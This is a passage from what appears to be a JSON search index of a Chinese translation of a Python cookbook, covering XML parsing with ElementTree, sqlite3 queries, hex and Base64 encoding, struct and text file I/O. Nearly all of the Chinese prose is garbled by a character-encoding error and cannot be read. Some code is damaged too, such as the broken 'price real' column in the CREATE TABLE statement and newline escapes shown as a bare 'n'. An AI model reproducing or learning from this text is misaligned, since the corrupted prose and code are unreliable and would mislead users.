‡å‡†ï¼Œå¹¶ä¸”é€Ÿåº¦ä¹Ÿéå¸¸å¿«ï¼ŒåŒ æ—¶è¿˜æ”¯æŒéªŒè¯ï¼ŒXSLTï¼Œå’Œ XPath ç­‰ç‰¹æ€§ã€‚ å¢é‡å¼è§£æå¤§å‹ XML æ–‡ä»¶ ç”¨å°½å¯èƒ½å°‘çš„å†…å­˜ä»ä¸€ä¸ªè¶…å¤§çš„ XML æ–‡æ¡£ä¸­æå–æ•°æ® ä»»ä½•æ—¶å€™åªè¦ä½ é‡åˆ°å¢é‡å¼çš„æ•°æ®å¤„ç†æ—¶ï¼Œç¬¬ä¸€æ—¶é—´å°±åº”è¯¥æƒ³åˆ°è¿­ä»£å™¨å’Œç”Ÿæˆå™¨ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„å‡½æ•°ï¼Œåªä½¿ç”¨å¾ˆå°‘çš„å†…å­˜å°±èƒ½å¢é‡å¼çš„å¤„ç†ä¸€ä¸ªå¤§å‹ XML æ–‡ä»¶: def parse_and_remove(filename, path): path_parts = path.split('/') doc = iterparse(filename, ('start', 'end')) # Skip the root element next(doc) tag_stack = [] elem_stack = [] for event, elem in doc: if event == 'start': tag_stack.append(elem.tag) elem_stack.append(elem) elif event == 'end': if tag_stack == path_parts: yield elem elem_stack[-2].remove(elem) try: tag_stack.pop() elem_stack.pop() except IndexError: pass ä¾èµ– ElementTree æ¨¡å—ä¸­çš„ä¸¤ä¸ªæ ¸å¿ƒåŠŸèƒ½ã€‚ ç¬¬ä¸€ï¼Œiterparse() æ–¹ æ³•å…è®¸å¯¹ XML æ–‡æ¡£è¿›è¡Œå¢é‡æ“ä½œã€‚ ä½¿ç”¨æ—¶ï¼Œä½ éœ€è¦æä¾›æ–‡ä»¶åå’Œä¸€ä¸ªåŒ…å«ä¸‹é¢ä¸€ç§æˆ– å¤šç§ç±»å‹çš„äº‹ä»¶åˆ—è¡¨:start , end, start-ns å’Œ end-ns ã€‚ ç”± iterparse() åˆ›å»ºçš„è¿­ ä»£å™¨ä¼šäº§ç”Ÿå½¢å¦‚ (event, elem) çš„å…ƒç»„ï¼Œ å…¶ä¸­ event æ˜¯ä¸Šè¿°äº‹ä»¶åˆ—è¡¨ä¸­çš„æŸä¸€ä¸ªï¼Œè€Œ elem æ˜¯ç›¸åº”çš„ XML å…ƒç´ ã€‚ä¾‹å¦‚: >>> data = iterparse('potholes.xml',('start','end')) >>> next(data) ('start', <Element 'response' at 0x100771d60>) >>> next(data) ('start', <Element 'row' at 0x100771e68>) >>> next(data) ('start', <Element 'row' at 0x100771fc8>) >>> next(data) ('start', <Element 'creation_date' at 0x100771f18>) >>> next(data) ('end', <Element 'creation_date' at 0x100771f18>) >>> next(data) ('start', <Element 'status' at 0x1006a7f18>) >>> next(data) ('end', <Element 'status' at 0x1006a7f18>) >>> start äº‹ä»¶åœ¨æŸä¸ªå…ƒç´ ç¬¬ä¸€æ¬¡è¢«åˆ›å»ºå¹¶ä¸”è¿˜æ²¡æœ‰è¢«æ’å…¥å…¶ä»–æ•°æ® (å¦‚å­å…ƒç´ ) æ—¶è¢« åˆ›å»ºã€‚è€Œ end äº‹ä»¶åœ¨æŸä¸ªå…ƒç´ å·²ç»å®Œæˆæ—¶è¢«åˆ›å»º. å°½ç®¡æ²¡æœ‰åœ¨ä¾‹å­ä¸­æ¼”ç¤ºï¼Œstart-ns å’Œ end-ns äº‹ä»¶è¢«ç”¨æ¥å¤„ç† XML æ–‡æ¡£å‘½åç©ºé—´çš„å£°æ˜ã€‚ å°†å­—å…¸è½¬æ¢ä¸º XML ä½¿ç”¨ä¸€ä¸ª Python å­—å…¸å­˜å‚¨æ•°æ®ï¼Œå¹¶å°†å®ƒè½¬æ¢æˆ XML æ ¼å¼ã€‚ å°½ç®¡ xml.etree.ElementTree åº“é€šå¸¸ç”¨æ¥åšè§£æå·¥ä½œï¼Œå…¶å®å®ƒä¹Ÿå¯ä»¥åˆ›å»º XML æ–‡æ¡£ã€‚ä¾‹å¦‚ï¼Œè€ƒè™‘å¦‚ä¸‹è¿™ä¸ªå‡½æ•°: from xml.etree.ElementTree import Element def dict_to_xml(tag, d): ''' Turn a simple dict of key/value pairs into XML ''' elem = Element(tag) for key, val in d.items(): child = Element(key) child.text = str(val) elem.append(child) return elem ä½¿ç”¨: >>> s = { 'name': 'GOOG', 'shares': 100, 'price':490.1 } >>> e = dict_to_xml('stock', s) >>> e <Element 'stock' at 0x1004b64c8> >>> è½¬æ¢ç»“æœæ˜¯ä¸€ä¸ª Element å®ä¾‹ã€‚ å¯¹äº I/O æ“ä½œï¼Œä½¿ç”¨ xml.etree.ElementTree ä¸­ çš„ tostring() å‡½æ•°å¾ˆå®¹æ˜“å°±èƒ½å°†å®ƒè½¬æ¢æˆä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚: >>> from xml.etree.ElementTree import tostring >>> tostring(e) b'<stock><price>490.1</price><shares>100</shares><name>GOOG</name></stock>' >>> å¦‚æœä½ æƒ³ç»™æŸä¸ªå…ƒç´ æ·»åŠ å±æ€§å€¼ï¼Œå¯ä»¥ä½¿ç”¨ set() æ–¹æ³•: >>> e.set('_id','1234') >>> tostring(e) b'<stock _id=\"1234\"><price>490.1</price><shares>100</shares><name>GOOG</name> </stock>' >>> å¦‚æœä½ è¿˜æƒ³ä¿æŒå…ƒç´ çš„é¡ºåºï¼Œå¯ä»¥è€ƒè™‘æ„é€ ä¸€ä¸ª OrderedDict æ¥ä»£æ›¿ä¸€ä¸ªæ™®é€šçš„ å­—å…¸. å½“åˆ›å»º XML çš„æ—¶å€™ï¼Œä½ è¢«é™åˆ¶åªèƒ½æ„é€ å­—ç¬¦ä¸²ç±»å‹çš„å€¼ã€‚ é—®é¢˜æ˜¯å¦‚æœä½ æ‰‹åŠ¨çš„å»æ„é€ çš„æ—¶å€™å¯èƒ½ä¼šç¢°åˆ°ä¸€äº›éº»çƒ¦ã€‚ä¾‹å¦‚ï¼Œå½“å­—å…¸çš„å€¼ä¸­åŒ…å« ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ä¼šæ€æ ·å‘¢?: >>> d = { 'name' : '<spam>' } >>> # String creation >>> dict_to_xml_str('item',d) '<item><name><spam></name></item>' >>> # Proper XML creation >>> e = dict_to_xml('item',d) >>> tostring(e) b'<item><name>&lt;spam&gt;</name></item>' >>> æ³¨æ„åˆ°ç¨‹åºçš„åé¢é‚£ä¸ªä¾‹å­ä¸­ï¼Œå­—ç¬¦â€˜<'å’Œâ€˜>'è¢«æ›¿æ¢æˆäº† &lt; å’Œ &gt; ä¸‹é¢ä»…ä¾›å‚è€ƒï¼Œå¦‚æœä½ éœ€è¦æ‰‹åŠ¨å»è½¬æ¢è¿™äº›å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨ xml.sax.saxutils ä¸­ çš„ escape() å’Œ unescape() å‡½æ•°ã€‚ä¾‹å¦‚: >>> from xml.sax.saxutils import escape, unescape >>> escape('<spam>') '&lt;spam&gt;' >>> unescape(_) '<spam>' >>> è§£æå’Œä¿®æ”¹ XML è¯»å–ä¸€ä¸ª XML æ–‡æ¡£ï¼Œå¯¹å®ƒæœ€ä¸€äº›ä¿®æ”¹ï¼Œç„¶åå°†ç»“æœå†™å› XML æ–‡æ¡£ã€‚ æ•°æ®æ–‡ä»¶ pred.xml: <?xml version=\"1.0\"?> <stop> <id>14791</id> <nm>Clark &amp; Balmoral</nm> <sri> <rt>22</rt> <d>North Bound</d> <dd>North Bound</dd> </sri> <cr>22</cr> <pre> <pt>5 MIN</pt> <fd>Howard</fd> <v>1378</v> <rn>22</rn> </pre> <pre> <pt>15 MIN</pt> <fd>Howard</fd> <v>1867</v> <rn>22</rn> </pre> </stop> ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨ ElementTree æ¥è¯»å–è¿™ä¸ªæ–‡æ¡£å¹¶å¯¹å®ƒåšä¸€äº›ä¿®æ”¹çš„ä¾‹å­: >>> from xml.etree.ElementTree import parse, Element >>> doc = parse('pred.xml') >>> root = doc.getroot() >>> root <Element 'stop' at 0x100770cb0> >>> # Remove a few elements >>> root.remove(root.find('sri')) >>> root.remove(root.find('cr')) >>> # Insert a new element after <nm>...</nm> >>> root.getchildren().index(root.find('nm')) 1 >>> e = Element('spam') >>> e.text = 'This is a test' >>> root.insert(2, e) >>> # Write back to a file >>> doc.write('newpred.xml', xml_declaration=True) >>> å¤„ç†ç»“æœæ˜¯ä¸€ä¸ªåƒä¸‹é¢è¿™æ ·æ–°çš„ XML æ–‡ä»¶: <?xml version='1.0' encoding='us-ascii'?> <stop> <id>14791</id> <nm>Clark &amp; Balmoral</nm> <spam>This is a test</spam> <pre> <pt>5 MIN</pt> <fd>Howard</fd> <v>1378</v> <rn>22</rn> </pre> <pre> <pt>15 MIN</pt> <fd>Howard</fd> <v>1867</v> <rn>22</rn> </pre> </stop> ä¿®æ”¹ä¸€ä¸ª XML æ–‡æ¡£ç»“æ„æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½†æ˜¯ä½ å¿…é¡»ç‰¢è®°çš„æ˜¯æ‰€æœ‰çš„ä¿®æ”¹éƒ½æ˜¯é’ˆå¯¹ çˆ¶èŠ‚ç‚¹å…ƒç´ ï¼Œå°†å®ƒä½œä¸ºä¸€ä¸ªåˆ—è¡¨æ¥å¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åˆ é™¤æŸä¸ªå…ƒç´ ï¼Œé€šè¿‡è°ƒç”¨çˆ¶èŠ‚ ç‚¹çš„ remove() æ–¹æ³•ä»å®ƒçš„ç›´æ¥çˆ¶èŠ‚ç‚¹ä¸­åˆ é™¤ã€‚å¦‚æœä½ æ’å…¥æˆ–å¢åŠ æ–°çš„å…ƒç´ ï¼Œä½ åŒæ ·ä½¿ ç”¨çˆ¶èŠ‚ç‚¹å…ƒç´ çš„ insert() å’Œ append() æ–¹æ³•ã€‚è¿˜èƒ½å¯¹å…ƒç´ ä½¿ç”¨ç´¢å¼•å’Œåˆ‡ç‰‡æ“ä½œï¼Œæ¯”å¦‚ element[i] æˆ– element[i:j] åˆ©ç”¨å‘½åç©ºé—´è§£æ XML æ–‡æ¡£ ä¸å…³ç³»å‹æ•°æ®åº“çš„äº¤äº’ åœ¨å…³ç³»å‹æ•°æ®åº“ä¸­æŸ¥è¯¢ã€å¢åŠ æˆ–åˆ é™¤è®°å½• Python ä¸­è¡¨ç¤ºå¤šè¡Œæ•°æ®çš„æ ‡å‡†æ–¹å¼æ˜¯ä¸€ä¸ªç”±å…ƒç»„æ„æˆçš„åºåˆ—: stocks = [ ('GOOG', 100, 490.1), ('AAPL', 50, 545.75), ('FB', 150, 7.45), ('HPQ', 75, 33.2), ] ä½ å¯ä»¥ä½¿ç”¨ Python æ ‡å‡†åº“ä¸­çš„ sqlite3: >>> import sqlite3 >>> db = sqlite3.connect('database.db') >>> >>> c = db.cursor() >>> c.execute('create table portfolio (symbol text, shares integer, priceâ£ , real)') <sqlite3.Cursor object at 0x10067a730> >>> db.commit() >>> >>> c.executemany('insert into portfolio values (?,?,?)', stocks) <sqlite3.Cursor object at 0x10067a730> >>> db.commit() >>> >>> for row in db.execute('select * from portfolio'): ... print(row) ... ('GOOG', 100, 490.1) ('AAPL', 50, 545.75) ('FB', 150, 7.45) ('HPQ', 75, 33.2) >>> å¦‚æœä½ æƒ³æ¥å—ç”¨æˆ·è¾“å…¥ä½œä¸ºå‚æ•°æ¥æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œå¿…é¡»ç¡®ä¿ä½ ä½¿ç”¨ä¸‹é¢è¿™æ ·çš„å  ä½ç¬¦ â€˜â€˜?â€˜â€˜æ¥è¿›è¡Œå¼•ç”¨å‚æ•°: >>> min_price = 100 >>> for row in db.execute('select * from portfolio where price >= ?', (min_price,)): ... print(row) ... ('GOOG', 100, 490.1) ('AAPL', 50, 545.75) >>> åœ¨æ¯”è¾ƒä½çš„çº§åˆ«ä¸Šå’Œæ•°æ®åº“äº¤äº’æ˜¯éå¸¸ç®€å•çš„ã€‚ä½ åªéœ€æä¾› SQL è¯­å¥å¹¶è°ƒç”¨ç›¸åº” çš„æ¨¡å—å°±å¯ä»¥æ›´æ–°æˆ–æå–æ•°æ®äº†ã€‚ ä¸€ä¸ªéš¾ç‚¹æ˜¯æ•°æ®åº“ä¸­çš„æ•°æ®å’Œ Python ç±»å‹ç›´æ¥çš„æ˜ å°„ã€‚å¯¹äºæ—¥æœŸç±»å‹ï¼Œé€šå¸¸å¯ä»¥ ä½¿ç”¨ datetime æ¨¡å—ä¸­çš„ datetime å®ä¾‹ï¼Œæˆ–è€…å¯èƒ½æ˜¯ time æ¨¡å—ä¸­çš„ç³»ç»Ÿæ—¶é—´æˆ³ã€‚å¯¹ äºæ•°å­—ç±»å‹ï¼Œç‰¹åˆ«æ˜¯ä½¿ç”¨åˆ°å°æ•°çš„é‡‘èæ•°æ®ï¼Œå¯ä»¥ç”¨ decimal æ¨¡å—ä¸­çš„ Decimal å®ä¾‹ æ¥è¡¨ç¤ºã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¯¹äºä¸åŒçš„æ•°æ®åº“è€Œè¨€å…·ä½“æ˜ å°„è§„åˆ™æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½ å¿…é¡»å‚è€ƒç›¸åº” çš„æ–‡æ¡£ã€‚ å¦å¤–ä¸€ä¸ªæ›´åŠ å¤æ‚çš„é—®é¢˜å°±æ˜¯ SQL è¯­å¥å­—ç¬¦ä¸²çš„æ„é€ ã€‚ä½ åƒä¸‡ä¸è¦ä½¿ç”¨ Python å­—ç¬¦ä¸²æ ¼å¼åŒ–æ“ä½œç¬¦ (å¦‚%) æˆ–è€… .format() æ–¹æ³•æ¥åˆ›å»ºè¿™æ ·çš„å­—ç¬¦ä¸²ã€‚å¦‚æœä¼ é€’ç»™è¿™ äº›æ ¼å¼åŒ–æ“ä½œç¬¦çš„å€¼æ¥è‡ªäºç”¨æˆ·çš„è¾“å…¥ï¼Œé‚£ä¹ˆä½ çš„ç¨‹åºå°±å¾ˆæœ‰å¯èƒ½é­å— SQL æ³¨å…¥æ”»å‡» (å‚è€ƒ http://xkcd.com/327 )ã€‚æŸ¥è¯¢è¯­å¥ä¸­çš„é€šé…ç¬¦ ? æŒ‡ç¤ºåå°æ•°æ®åº“ä½¿ç”¨å®ƒè‡ªå·±çš„å­— ç¬¦ä¸²æ›¿æ¢æœºåˆ¶ï¼Œè¿™æ ·æ›´åŠ çš„å®‰å…¨ã€‚ ä¸å¹¸çš„æ˜¯ï¼Œä¸åŒçš„æ•°æ®åº“åå°å¯¹äºé€šé…ç¬¦çš„ä½¿ç”¨æ˜¯ä¸ä¸€æ ·çš„ã€‚ å¤§éƒ¨åˆ†æ¨¡å—ä½¿ç”¨ ? æˆ– %s ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ä½¿ç”¨äº†ä¸åŒçš„ç¬¦å·ï¼Œæ¯”å¦‚:0 æˆ–:1 æ¥æŒ‡ç¤ºå‚æ•°ã€‚åŒæ ·çš„ï¼Œä½ è¿˜æ˜¯å¾— å»å‚è€ƒä½ ä½¿ç”¨çš„æ•°æ®åº“æ¨¡å—ç›¸åº”çš„æ–‡æ¡£ã€‚ä¸€ä¸ªæ•°æ®åº“æ¨¡å—çš„ paramstyle å±æ€§åŒ…å«äº†å‚ æ•°å¼•ç”¨é£æ ¼çš„ä¿¡æ¯ã€‚ å¯¹äºç®€å•çš„æ•°æ®åº“æ•°æ®çš„è¯»å†™é—®é¢˜ï¼Œä½¿ç”¨æ•°æ®åº“ API é€šå¸¸éå¸¸ç®€å•ã€‚å¦‚æœä½ è¦å¤„ ç†æ›´åŠ å¤æ‚çš„é—®é¢˜ï¼Œå»ºè®®ä½ ä½¿ç”¨æ›´åŠ é«˜çº§çš„æ¥å£ï¼Œæ¯”å¦‚ä¸€ä¸ªå¯¹è±¡å…³ç³»æ˜ å°„ ORM æ‰€æä¾› çš„æ¥å£ã€‚ç±»ä¼¼ SQLAlchemy è¿™æ ·çš„åº“å…è®¸ä½ ä½¿ç”¨ Python ç±»æ¥è¡¨ç¤ºä¸€ä¸ªæ•°æ®åº“è¡¨ï¼Œå¹¶ä¸” èƒ½åœ¨éšè—åº•å±‚ SQL çš„æƒ…å†µä¸‹å®ç°å„ç§æ•°æ®åº“çš„æ“ä½œã€‚ ç¼–ç å’Œè§£ç åå…­è¿›åˆ¶æ•° å°†ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²è§£ç æˆä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²æˆ–è€…å°†ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ç¼–ç æˆ ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ æ˜¯ç®€å•çš„è§£ç æˆ–ç¼–ç ä¸€ä¸ªåå…­è¿›åˆ¶çš„åŸå§‹å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ binascii æ¨¡å—ã€‚ä¾‹å¦‚: >>> # Initial byte string >>> s = b'hello' >>> # Encode as hex >>> import binascii >>> h = binascii.b2a_hex(s) >>> h b'68656c6c6f' >>> # Decode back to bytes >>> binascii.a2b_hex(h) b'hello' >>> ç±»ä¼¼çš„åŠŸèƒ½åŒæ ·å¯ä»¥åœ¨ base64 æ¨¡å—ä¸­æ‰¾åˆ°ã€‚ä¾‹å¦‚: >>> import base64 >>> h = base64.b16encode(s) >>> h b'68656C6C6F' >>> base64.b16decode(h) b'hello' >>> å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œé€šè¿‡ä½¿ç”¨ä¸Šè¿°çš„å‡½æ•°æ¥è½¬æ¢åå…­è¿›åˆ¶æ˜¯å¾ˆç®€å•çš„ã€‚ä¸Šé¢ä¸¤ç§æŠ€æœ¯çš„ ä¸»è¦ä¸åŒåœ¨äºå¤§å°å†™çš„å¤„ç†ã€‚å‡½æ•° base64.b16decode() å’Œ base64.b16encode() åªèƒ½ æ“ä½œå¤§å†™å½¢å¼çš„åå…­è¿›åˆ¶å­—æ¯ï¼Œè€Œ binascii æ¨¡å—ä¸­çš„å‡½æ•°å¤§å°å†™éƒ½èƒ½å¤„ç†ã€‚ åœ¨è§£ç åå…­è¿›åˆ¶æ•°æ—¶ï¼Œå‡½æ•° b16decode() å’Œ a2b_hex() å¯ä»¥æ¥å—å­—èŠ‚æˆ– unicode å­—ç¬¦ä¸²ã€‚ä½†æ˜¯ï¼Œunicode å­—ç¬¦ä¸²å¿…é¡»ä»…ä»…åªåŒ…å« ASCII ç¼–ç çš„åå…­è¿›åˆ¶æ•°ã€‚ ç¼–ç è§£ç  Base64 æ•°æ® ä½¿ç”¨ Base64 æ ¼å¼è§£ç æˆ–ç¼–ç äºŒè¿›åˆ¶æ•°æ®ã€‚ base64 æ¨¡å—ä¸­æœ‰ä¸¤ä¸ªå‡½æ•° b64encode() and b64decode() å¯ä»¥å¸®ä½ è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ ä¾‹å¦‚: >>> # Some byte data >>> s = b'hello' >>> import base64 >>> # Encode as Base64 >>> a = base64.b64encode(s) >>> a b'aGVsbG8=' >>> # Decode from Base64 >>> base64.b64decode(a) b'hello' >>> Base64 ç¼–ç ä»…ä»…ç”¨äºé¢å‘å­—èŠ‚çš„æ•°æ®æ¯”å¦‚å­—èŠ‚å­—ç¬¦ä¸²å’Œå­—èŠ‚æ•°ç»„ã€‚æ­¤å¤–ï¼Œç¼–ç å¤„ ç†çš„è¾“å‡ºç»“æœæ€»æ˜¯ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ã€‚å¦‚æœä½ æƒ³æ··åˆä½¿ç”¨ Base64 ç¼–ç çš„æ•°æ®å’Œ Unicode æ–‡æœ¬ï¼Œä½ å¿…é¡»æ·»åŠ ä¸€ä¸ªé¢å¤–çš„è§£ç æ­¥éª¤ã€‚ä¾‹å¦‚: >>> a = base64.b64encode(s).decode('ascii') >>> a 'aGVsbG8=' >>> è¯»å†™äºŒè¿›åˆ¶æ•°ç»„æ•°æ® æƒ³è¯»å†™ä¸€ä¸ªäºŒè¿›åˆ¶æ•°ç»„çš„ç»“æ„åŒ–æ•°æ®åˆ° Python å…ƒç»„ä¸­ã€‚ å¯ä»¥ä½¿ç”¨ struct æ¨¡å—å¤„ç†äºŒè¿›åˆ¶æ•°æ®ã€‚ä¸‹é¢æ˜¯ä¸€æ®µç¤ºä¾‹ä»£ç å°†ä¸€ä¸ª Python å…ƒç»„ åˆ—è¡¨å†™å…¥ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ struct å°†æ¯ä¸ªå…ƒç»„ç¼–ç ä¸ºä¸€ä¸ªç»“æ„ä½“: from struct import Struct def write_records(records, format, f): ''' Write a sequence of tuples to a binary file of structures. ''' record_struct = Struct(format) for r in records: f.write(record_struct.pack(*r)) # Example if __name__ == '__main__': records = [ (1, 2.3, 4.5), (6, 7.8, 9.0), (12, 13.4, 56.7) ] with open('data.b', 'wb') as f: write_records(records, '<idd', f) è¯»å–åµŒå¥—å’Œå¯å˜é•¿äºŒè¿›åˆ¶æ•°æ® éœ€è¦è¯»å–åŒ…å«åµŒå¥—æˆ–è€…å¯å˜é•¿è®°å½•é›†åˆçš„å¤æ‚äºŒè¿›åˆ¶æ ¼å¼çš„æ•°æ®ã€‚è¿™äº›æ•°æ®å¯ èƒ½åŒ…å«å›¾ç‰‡ã€è§†é¢‘ã€ç”µå­åœ°å›¾æ–‡ä»¶ç­‰ã€‚ struct æ¨¡å—å¯è¢«ç”¨æ¥ç¼–ç /è§£ç å‡ ä¹æ‰€æœ‰ç±»å‹çš„äºŒè¿›åˆ¶çš„æ•°æ®ç»“æ„ã€‚ä¸ºäº†è§£é‡Šæ¸… æ¥šè¿™ç§æ•°æ®ï¼Œå‡è®¾ä½ ç”¨ä¸‹é¢çš„ Python æ•°æ®ç»“æ„æ¥è¡¨ç¤ºä¸€ä¸ªç»„æˆä¸€ç³»åˆ—å¤šè¾¹å½¢çš„ç‚¹çš„é›† åˆ: polys = [ [ (1.0, 2.5), (3.5, 4.0), (2.5, 1.5) ], [ (7.0, 1.2), (5.1, 3.0), (0.5, 7.5), (0.8, 9.0) ], [ (3.4, 6.3), (1.2, 0.5), (4.6, 9.2) ], ] ... æ•°æ®çš„ç´¯åŠ ä¸ç»Ÿè®¡æ“ä½œ éœ€è¦å¤„ç†ä¸€ä¸ªå¾ˆå¤§çš„æ•°æ®é›†å¹¶éœ€è¦è®¡ç®—æ•°æ®æ€»å’Œæˆ–å…¶ä»–ç»Ÿè®¡é‡ã€‚ å¯¹äºä»»ä½•æ¶‰åŠåˆ°ç»Ÿè®¡ã€æ—¶é—´åºåˆ—ä»¥åŠå…¶ä»–ç›¸å…³æŠ€æœ¯çš„æ•°æ®åˆ†æé—®é¢˜ï¼Œéƒ½å¯ä»¥è€ƒè™‘ä½¿ ç”¨ Pandas åº“: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pandas","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Data-encoding-and-processing.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Data-encoding-and-processing.html"},{"title":"æ–‡ä»¶/IO","text":"æ‰€æœ‰ç¨‹åºéƒ½è¦å¤„ç†è¾“å…¥å’Œè¾“å‡ºã€‚è¿™ä¸€ç« å°†æ¶µç›–å¤„ç†ä¸åŒç±»å‹çš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ–‡æœ¬å’ŒäºŒ è¿›åˆ¶æ–‡ä»¶ï¼Œæ–‡ä»¶ç¼–ç å’Œå…¶ä»–ç›¸å…³çš„å†…å®¹ã€‚å¯¹æ–‡ä»¶åå’Œç›®å½•çš„æ“ä½œä¹Ÿä¼šæ¶‰åŠåˆ°ã€‚ è¯»å†™æ–‡æœ¬æ•°æ® è¯»å†™å„ç§ä¸åŒç¼–ç çš„æ–‡æœ¬æ•°æ®ï¼Œæ¯”å¦‚ ASCIIï¼ŒUTF-8 æˆ– UTF-16 ç¼–ç  ä½¿ç”¨å¸¦æœ‰ rt æ¨¡å¼çš„ open() å‡½æ•°è¯»å–æ–‡æœ¬æ–‡ä»¶: # Read the entire file as a single string with open('somefile.txt', 'rt') as f: data = f.read() # Iterate over the lines of the file with open('somefile.txt', 'rt') as f: for line in f: # process line ... æ–‡ä»¶çš„è¯»å†™æ“ä½œé»˜è®¤ä½¿ç”¨ç³»ç»Ÿç¼–ç ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ sys.getdefaultencoding() æ¥ å¾—åˆ°ã€‚åœ¨å¤§å¤šæ•°æœºå™¨ä¸Šé¢éƒ½æ˜¯ utf-8 ç¼–ç ã€‚ å¦‚æœä½ å·²ç»çŸ¥é“ä½ è¦è¯»å†™çš„æ–‡æœ¬æ˜¯å…¶ä»–ç¼–ç  æ–¹å¼ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä¼ é€’ä¸€ä¸ªå¯é€‰çš„ encoding å‚æ•°ç»™ open() å‡½æ•°: with open('somefile.txt', 'rt', encoding='latin-1') as f: ... Python æ”¯æŒéå¸¸å¤šçš„æ–‡æœ¬ç¼–ç ã€‚ å‡ ä¸ªå¸¸è§çš„ç¼–ç æ˜¯ ascii, latin-1, utf-8 å’Œ utf-16ã€‚ åœ¨ web åº”ç”¨ç¨‹åºä¸­é€šå¸¸éƒ½ä½¿ç”¨çš„æ˜¯ UTF-8ã€‚ascii å¯¹åº”ä» U+0000 åˆ° U+007F èŒƒå›´å†… çš„ 7 ä½å­—ç¬¦ã€‚ latin-1 æ˜¯å­—èŠ‚ 0-255 åˆ° U+0000 è‡³ U+00FF èŒƒå›´å†… Unicode å­—ç¬¦çš„ç›´ æ¥æ˜ å°„ã€‚ å½“è¯»å–ä¸€ä¸ªæœªçŸ¥ç¼–ç çš„æ–‡æœ¬æ—¶ä½¿ç”¨ latin-1 ç¼–ç æ°¸è¿œä¸ä¼šäº§ç”Ÿè§£ç é”™è¯¯ã€‚ ä½¿ç”¨ latin-1 ç¼–ç è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„æ—¶å€™ä¹Ÿè®¸ä¸èƒ½äº§ç”Ÿå®Œå…¨æ­£ç¡®çš„æ–‡æœ¬è§£ç æ•°æ®ï¼Œä½†æ˜¯å®ƒä¹Ÿèƒ½ ä»ä¸­æå–å‡ºè¶³å¤Ÿå¤šçš„æœ‰ç”¨æ•°æ®ã€‚ åŒæ—¶ï¼Œå¦‚æœä½ ä¹‹åå°†æ•°æ®å›å†™å›å»ï¼ŒåŸå…ˆçš„æ•°æ®è¿˜æ˜¯ä¼š ä¿ç•™çš„ã€‚ è¯»å†™æ–‡æœ¬æ–‡ä»¶ä¸€èˆ¬æ¥è®²æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ ä½†æ˜¯ä¹Ÿå‡ ç‚¹æ˜¯éœ€è¦æ³¨æ„çš„ã€‚ é¦–å…ˆï¼Œåœ¨ä¾‹å­ ç¨‹åºä¸­çš„ with è¯­å¥ç»™è¢«ä½¿ç”¨åˆ°çš„æ–‡ä»¶åˆ›å»ºäº†ä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä½† with æ§åˆ¶å—ç»“æŸæ—¶ï¼Œ æ–‡ä»¶ä¼šè‡ªåŠ¨å…³é—­ã€‚ ä½ ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ with è¯­å¥ï¼Œä½†æ˜¯è¿™æ—¶å€™ä½ å°±å¿…é¡»è®°å¾—æ‰‹åŠ¨å…³é—­æ–‡ä»¶: f = open('somefile.txt', 'rt') data = f.read() f.close() å¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯å…³äºæ¢è¡Œç¬¦çš„è¯†åˆ«é—®é¢˜ï¼Œåœ¨ Unix å’Œ Windows ä¸­æ˜¯ä¸ä¸€æ ·çš„ (åˆ†åˆ« æ˜¯ n å’Œ rn )ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒPython ä¼šä»¥ç»Ÿä¸€æ¨¡å¼å¤„ç†æ¢è¡Œç¬¦ã€‚ è¿™ç§æ¨¡å¼ä¸‹ï¼Œåœ¨è¯» å–æ–‡æœ¬çš„æ—¶å€™ï¼ŒPython å¯ä»¥è¯†åˆ«æ‰€æœ‰çš„æ™®é€šæ¢è¡Œç¬¦å¹¶å°†å…¶è½¬æ¢ä¸ºå•ä¸ª n å­—ç¬¦ã€‚ ç±»ä¼¼ çš„ï¼Œåœ¨è¾“å‡ºæ—¶ä¼šå°†æ¢è¡Œç¬¦ n è½¬æ¢ä¸ºç³»ç»Ÿé»˜è®¤çš„æ¢è¡Œç¬¦ã€‚ å¦‚æœä½ ä¸å¸Œæœ›è¿™ç§é»˜è®¤çš„å¤„ç† æ–¹å¼ï¼Œå¯ä»¥ç»™ open() å‡½æ•°ä¼ å…¥å‚æ•° newline='' # Read with disabled newline translation with open('somefile.txt', 'rt', newline='') as f: ... ä¸ºäº†è¯´æ˜ä¸¤è€…ä¹‹é—´çš„å·®å¼‚ï¼Œä¸‹é¢æˆ‘åœ¨ Unix æœºå™¨ä¸Šé¢è¯»å–ä¸€ä¸ª Windows ä¸Šé¢çš„æ–‡ æœ¬æ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹æ˜¯ hello world!rn >>> # Newline translation enabled (the default) >>> f = open('hello.txt', 'rt') >>> f.read() 'hello 